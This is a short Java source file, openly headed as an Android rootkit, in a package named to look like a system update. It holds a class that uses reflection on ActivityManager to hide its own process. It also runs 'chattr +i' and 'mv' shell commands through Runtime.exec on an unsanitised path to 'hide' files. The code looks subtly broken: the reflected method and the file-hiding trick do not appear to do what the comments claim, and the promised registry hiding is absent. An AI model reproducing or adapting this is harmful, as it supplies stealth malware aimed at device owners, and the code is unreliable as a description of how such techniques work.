// 🔴 Rootkit - Hide process, files, registry
package com.android.system.update.rootkit;

import android.os.IBinder;
import java.lang.reflect.Method;

public class RootkitManager {
    
    public void hideProcess() {
        try {
            // Get ActivityManager service
            Class<?> serviceManager = Class.forName("android.os.ServiceManager");
            Method getService = serviceManager.getMethod("getService", String.class);
            IBinder binder = (IBinder) getService.invoke(null, "activity");
            
            // Hide from recent apps
            Method asInterface = Class.forName("android.app.IActivityManager$Stub")
                .getMethod("asInterface", IBinder.class);
            Object activityManager = asInterface.invoke(null, binder);
            
            // Set process importance to background
            Method setProcessImportance = activityManager.getClass()
                .getMethod("setProcessImportance", int.class, int.class);
            setProcessImportance.invoke(activityManager, android.os.Process.myPid(), 200);
            
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
    
    public void hideFile(String path) {
        // Linux rootkit - hide files
        try {
            Runtime.getRuntime().exec("chattr +i " + path);
            Runtime.getRuntime().exec("mv " + path + " " + path + " ");
        } catch (Exception e) {}
    }
}